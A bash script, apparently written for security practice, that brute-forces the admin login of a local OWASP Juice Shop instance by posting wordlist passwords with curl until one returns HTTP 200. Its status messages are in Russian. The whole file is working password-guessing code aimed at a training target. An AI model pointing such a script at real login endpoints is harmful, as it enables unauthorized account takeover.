#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

TARGET="http://localhost:3000/rest/user/login"
USER="admin@juice-sh.op"
WORDLIST="$SCRIPT_DIR/wordlist.txt"

if [ ! -f "$WORDLIST" ]; then
  echo "[!] Wordlist not found: $WORDLIST"
  exit 1
fi

while read -r PASS; do
  echo "[*] Пробую пароль: $PASS"

  HTTP_CODE=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$USER\",\"password\":\"$PASS\"}" \
    -o /dev/null -w "%{http_code}")

  echo "   Код ответа: $HTTP_CODE"

  if [ "$HTTP_CODE" -eq 200 ]; then
    echo "[+] Пароль найден: $PASS"
    exit 0
  fi

  sleep 0.3
done < "$WORDLIST"

echo "[-] Пароль не найден в wordlist."
exit 1
